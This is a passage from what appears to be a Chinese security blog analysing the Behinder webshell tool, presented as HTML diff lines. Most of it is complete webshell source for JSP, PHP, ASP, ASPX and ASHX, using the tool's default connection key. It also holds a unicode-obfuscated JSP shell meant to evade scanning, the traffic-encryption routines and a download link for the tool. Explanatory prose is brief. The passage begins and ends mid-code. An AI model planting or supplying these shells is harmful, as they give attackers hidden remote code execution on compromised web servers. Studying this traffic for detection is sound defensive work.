class="hljs-string">&#x27;replace&#x27;</span>)<br>print(result)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Content-type: application/x-www-form-urlencoded<br>Cache-Control: no-cache<br>Pragma: no-cache<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/behinder/1765359242006-b87f08f5-356e-4944-8212-e126f26fc7db.png" srcset="/img/loading.gif" lazyload></p>
+<p>不支持openssl扩展时依然会先尝试aes，返回500</p>
+<p><img src="/mdimg/behinder/1765359388206-18f799e1-d3f4-4d2a-a318-efbea9c39092.png" srcset="/img/loading.gif" lazyload></p>
+<p>shell.asp （xor加密逻辑与冰蝎v2.x一致）只不过是固定key</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<br>Response.CharSet = <span class="hljs-string">&quot;UTF-8&quot;</span> <br>k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span> <span class="hljs-string">&#x27;该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br><span class="hljs-string">Session(&quot;k&quot;)=k</span><br><span class="hljs-string">size=Request.TotalBytes</span><br><span class="hljs-string">content=Request.BinaryRead(size)</span><br><span class="hljs-string">For i=1 To size</span><br><span class="hljs-string">result=result&amp;Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))</span><br><span class="hljs-string">Next</span><br><span class="hljs-string">execute(result)</span><br><span class="hljs-string">%&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>shell.aspx    <code>AES-128-CBC  key = IV</code>但是key固定</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ Page Language=<span class="hljs-string">&quot;C#&quot;</span> %&gt;&lt;%<span class="hljs-meta">@Import</span> Namespace=<span class="hljs-string">&quot;System.Reflection&quot;</span>%&gt;&lt;%Session.Add(<span class="hljs-string">&quot;k&quot;</span>,<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>); <span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span><span class="hljs-type">byte</span>[] k = Encoding.Default.GetBytes(Session[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;&quot;</span>),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(<span class="hljs-keyword">new</span> <span class="hljs-title class_">System</span>.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, <span class="hljs-number">0</span>, c.Length)).CreateInstance(<span class="hljs-string">&quot;U&quot;</span>).Equals(<span class="hljs-built_in">this</span>);%&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Content-Type: application/octet-stream<br>Cache-Control: no-cache<br>Pragma: no-cache<br></code></pre></td></tr></table></figure>
+
+<h1 id="V4-x"><a href="#V4-x" class="headerlink" title="V4.x"></a>V4.x</h1><p><a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases/download/Behinder_v4.1%E3%80%90t00ls%E4%B8%93%E7%89%88%E3%80%91/Behinder_v4.1.t00ls.zip">https://github.com/rebeyond/Behinder/releases/download/Behinder_v4.1%E3%80%90t00ls%E4%B8%93%E7%89%88%E3%80%91/Behinder_v4.1.t00ls.zip</a></p>
+<p>shell.jsp同V3.x</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span>&#123;U(ClassLoader c)&#123;<span class="hljs-built_in">super</span>(c);&#125;<span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span> []b)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b,<span class="hljs-number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="hljs-keyword">if</span> (request.getMethod().equals(<span class="hljs-string">&quot;POST&quot;</span>))&#123;String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.putValue(<span class="hljs-string">&quot;u&quot;</span>,k);Cipher c=Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(k.getBytes(),<span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>shell.jspx同V3.x</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span>&#123;U(ClassLoader c)&#123;<span class="hljs-built_in">super</span>(c);&#125;<span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span> []b)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b,<span class="hljs-number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="hljs-keyword">if</span> (request.getMethod().equals(<span class="hljs-string">&quot;POST&quot;</span>))&#123;String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.putValue(<span class="hljs-string">&quot;u&quot;</span>,k);Cipher c=Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(k.getBytes(),<span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>shell_java9.jsp 同V3.x（兼容java8+，只是换了base64编码库，加解密一样）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span>&#123;U(ClassLoader c)&#123;<span class="hljs-built_in">super</span>(c);&#125;<span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span> []b)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b,<span class="hljs-number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="hljs-keyword">if</span> (request.getMethod().equals(<span class="hljs-string">&quot;POST&quot;</span>))&#123;String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.putValue(<span class="hljs-string">&quot;u&quot;</span>,k);Cipher c=Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(k.getBytes(),<span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>shell_uni.jsp unicode编码的shell.jsp</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;<br>&lt;%!\u0063\u006c\u0061\u0073\u0073\u0020\u0055\u0020\u0065\u0078\u0074\u0065\u006e\u0064\u0073\u0020\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072\u007b\u0055\u0028\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072\u0020\u0063\u0029\u007b\u0073\u0075\u0070\u0065\u0072\u0028\u0063\u0029\u003b\u007d\u0070\u0075\u0062\u006c\u0069\u0063\u0020\u0043\u006c\u0061\u0073\u0073\u0020\u0067\u0028\u0062\u0079\u0074\u0065\u0020\u005b\u005d\u0062\u0029\u007b\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u0073\u0075\u0070\u0065\u0072\u002e\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073\u0028\u0062\u002c\u0030\u002c\u0062\u002e\u006c\u0065\u006e\u0067\u0074\u0068\u0029\u003b\u007d\u007d%&gt;<br>&lt;%\u0069\u0066\u0020\u0028\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0029\u002e\u0065\u0071\u0075\u0061\u006c\u0073\u0028\u0022\u0050\u004f\u0053\u0054\u0022\u0029\u0029\u007b\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u006b\u003d\u0022\u0065\u0034\u0035\u0065\u0033\u0032\u0039\u0066\u0065\u0062\u0035\u0064\u0039\u0032\u0035\u0062\u0022\u003b\u002f\u002a\u003f\u00b1\u004b\u003f\u003f\u003f\u00b1\u00b5\u00b1\u004b\u003f\u0033\u0032\u00a6\u00ec\u006d\u0064\u0035\u00ad\u00c8\u00aa\u00ba\u00ab\u0065\u0031\u0036\u00a6\u00ec\u00a1\u0041\u00c0\u0071\u003f\u003f\u00b1\u00b5\u00b1\u004b\u003f\u0072\u0065\u0062\u0065\u0079\u006f\u006e\u0064\u002a\u002f\u0073\u0065\u0073\u0073\u0069\u006f\u006e\u002e\u0070\u0075\u0074\u0056\u0061\u006c\u0075\u0065\u0028\u0022\u0075\u0022\u002c\u006b\u0029\u003b\u0043\u0069\u0070\u0068\u0065\u0072\u0020\u0063\u003d\u0043\u0069\u0070\u0068\u0065\u0072\u002e\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u0028\u0022\u0041\u0045\u0053\u0022\u0029\u003b\u0063\u002e\u0069\u006e\u0069\u0074\u0028\u0032\u002c\u006e\u0065\u0077\u0020\u0053\u0065\u0063\u0072\u0065\u0074\u004b\u0065\u0079\u0053\u0070\u0065\u0063\u0028\u006b\u002e\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0028\u0029\u002c\u0022\u0041\u0045\u0053\u0022\u0029\u0029\u003b\u006e\u0065\u0077\u0020\u0055\u0028\u0074\u0068\u0069\u0073\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072\u0028\u0029\u0029\u002e\u0067\u0028\u0063\u002e\u0064\u006f\u0046\u0069\u006e\u0061\u006c\u0028\u006e\u0065\u0077\u0020\u0073\u0075\u006e\u002e\u006d\u0069\u0073\u0063\u002e\u0042\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072\u0028\u0029\u002e\u0064\u0065\u0063\u006f\u0064\u0065\u0042\u0075\u0066\u0066\u0065\u0072\u0028\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0052\u0065\u0061\u0064\u0065\u0072\u0028\u0029\u002e\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065\u0028\u0029\u0029\u0029\u0029\u002e\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u0028\u0029\u002e\u0065\u0071\u0075\u0061\u006c\u0073\u0028\u0070\u0061\u0067\u0065\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u0029\u003b\u007d%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>shell.php同V3.x</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?php<br><span class="hljs-meta">@error_reporting(0)</span>;<br>session_start();<br>    $key=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>; <span class="hljs-comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br>	$_SESSION[<span class="hljs-string">&#x27;k&#x27;</span>]=$key;<br>	session_write_close();<br>	$post=file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br>	<span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>	&#123;<br>		$t=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br>		$post=$t($post.<span class="hljs-string">&quot;&quot;</span>);<br>		<br>		<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($post);$i++) &#123;<br>    			 $post[$i] = $post[$i]^$key[$i+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    			&#125;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		$post=openssl_decrypt($post, <span class="hljs-string">&quot;AES128&quot;</span>, $key);<br>	&#125;<br>    $arr=explode(<span class="hljs-string">&#x27;|&#x27;</span>,$post);<br>    $func=$arr[<span class="hljs-number">0</span>];<br>    $params=$arr[<span class="hljs-number">1</span>];<br>	<span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span>&#123;<span class="hljs-keyword">public</span> function <span class="hljs-title function_">__invoke</span><span class="hljs-params">($p)</span> &#123;eval($p.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    <span class="hljs-meta">@call_user_func(new C(),$params)</span>;<br>?&gt;<br><br></code></pre></td></tr></table></figure>
+
+<p>shell.asp同V3.x</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<br>Response.CharSet = <span class="hljs-string">&quot;UTF-8&quot;</span> <br>k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span> <span class="hljs-string">&#x27;该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br><span class="hljs-string">Session(&quot;k&quot;)=k</span><br><span class="hljs-string">size=Request.TotalBytes</span><br><span class="hljs-string">content=Request.BinaryRead(size)</span><br><span class="hljs-string">For i=1 To size</span><br><span class="hljs-string">result=result&amp;Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))</span><br><span class="hljs-string">Next</span><br><span class="hljs-string">execute(result)</span><br><span class="hljs-string">%&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>shell.aspx同V3.x</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ Page Language=<span class="hljs-string">&quot;C#&quot;</span> %&gt;&lt;%<span class="hljs-meta">@Import</span> Namespace=<span class="hljs-string">&quot;System.Reflection&quot;</span>%&gt;&lt;%Session.Add(<span class="hljs-string">&quot;k&quot;</span>,<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>); <span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span><span class="hljs-type">byte</span>[] k = Encoding.Default.GetBytes(Session[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;&quot;</span>),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(<span class="hljs-keyword">new</span> <span class="hljs-title class_">System</span>.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, <span class="hljs-number">0</span>, c.Length)).CreateInstance(<span class="hljs-string">&quot;U&quot;</span>).Equals(<span class="hljs-built_in">this</span>);%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>多了一个shell.ashx，没有html的aspx，<code>AES-128-CBC  key = IV</code>key固定</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;% @ webhandler language=<span class="hljs-string">&quot;C#&quot;</span> class=<span class="hljs-string">&quot;NodeHandler&quot;</span> %&gt; <br><br>using System; <br>using System.Web; <br>using System.Text;<br>using System.Reflection;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NodeHandler</span> : IHttpHandler,System.Web.SessionState.IRequiresSessionState<br>&#123; <br><span class="hljs-keyword">public</span> bool IsReusable <br>&#123; get &#123; <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; &#125; &#125; <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ProcessRequest</span><span class="hljs-params">(HttpContext ctx)</span> <br>&#123; <br>ctx.Session.Add(<span class="hljs-string">&quot;k&quot;</span>,<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>); <span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span><br><span class="hljs-type">byte</span>[] k = Encoding.Default.GetBytes(ctx.Session[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;&quot;</span>),c = ctx.Request.BinaryRead(ctx.Request.ContentLength);<br>Assembly.Load(<span class="hljs-keyword">new</span> <span class="hljs-title class_">System</span>.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, <span class="hljs-number">0</span>, c.Length)).CreateInstance(<span class="hljs-string">&quot;U&quot;</span>).Equals(ctx);<br>&#125; <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>默认与v3.x加解密方法一致，但是V4.x提供了自定义传输协议</p>
+<p><img src="/mdimg/behinder/1765275654834-6c31a5c6-0011-480a-af82-147d3b516a27.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/mdimg/behinder/1765458568507-a7a4c84d-bc91-4bb6-8f70-e7ea376f3e0f.png" srcset="/img/loading.gif" lazyload></p>
+<p>default_xor  实际上就是php不支持openssl时的xor加密</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] Encrypt(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    String key=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<br>	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; data.length; i++) &#123;<br>		data[i] = (<span class="hljs-type">byte</span>) ((data[i]) ^ (key.getBytes()[i + <span class="hljs-number">1</span> &amp; <span class="hljs-number">15</span>]));<br>	&#125;<br>	<span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] Decrypt(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    String key=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<br>	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; data.length; i++) &#123;<br>		data[i] = (<span class="hljs-type">byte</span>) ((data[i]) ^ (key.getBytes()[i + <span class="hljs-number">1</span> &amp; <span class="hljs-number">15</span>]));<br>	&#125;<br>	<span class="hljs-keyword">return</span> data;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>default_xor_base64  同上，只不过payload和响应base64编码了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] Encrypt(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    String key=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<br>	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; data.length; i++) &#123;<br>		data[i] = (<span class="hljs-type">byte</span>) ((data[i]) ^ (key.getBytes()[i + <span class="hljs-number">1</span> &amp; <span class="hljs-number">15</span>]));<br>	&#125;<br>	<span class="hljs-type">byte</span>[] encrypted ;<br>        Class baseCls;<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            baseCls=Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            Object Encoder=baseCls.getMethod(<span class="hljs-string">&quot;getEncoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(baseCls, <span class="hljs-literal">null</span>);<br>            encrypted= (<span class="hljs-type">byte</span>[]) Encoder.getClass().getMethod(<span class="hljs-string">&quot;encode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class&#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;data&#125;);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Throwable error)<br>        &#123;<br>            baseCls=Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Encoder&quot;</span>);<br>            Object Encoder=baseCls.newInstance();<br>            String result=(String) Encoder.getClass().getMethod(<span class="hljs-string">&quot;encode&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class&#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;data&#125;);<br>            result=result.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>            encrypted=result.getBytes();<br>        &#125;<br>	<span class="hljs-keyword">return</span> encrypted;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] Decrypt(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>     <span class="hljs-type">byte</span>[] decodebs;<br>        Class baseCls ;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    baseCls=Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>                    Object Decoder=baseCls.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(baseCls, <span class="hljs-literal">null</span>);<br>                    decodebs=(<span class="hljs-type">byte</span>[]) Decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class&#125;).invoke(Decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;data&#125;);<br>                &#125;<br>                <span class="hljs-keyword">catch</span> (Throwable e)<br>                &#123;<br>                    baseCls = Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>                    Object Decoder=baseCls.newInstance();<br>                    decodebs=(<span class="hljs-type">byte</span>[]) Decoder.getClass().getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;).invoke(Decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(data)&#125;);<br><br>                &#125;<br>    String key=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<br>	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; decodebs.length; i++) &#123;<br>		decodebs[i] = (<span class="hljs-type">byte</span>) ((decodebs[i]) ^ (key.getBytes()[i + <span class="hljs-number">1</span> &amp; <span class="hljs-number">15</span>]));<br>	&#125;<br>	<span class="hljs-keyword">return</span> decodebs;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>default_aes  就是jsp的aes加密</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] Encrypt(<span class="hljs-type">byte</span>[] data) <span 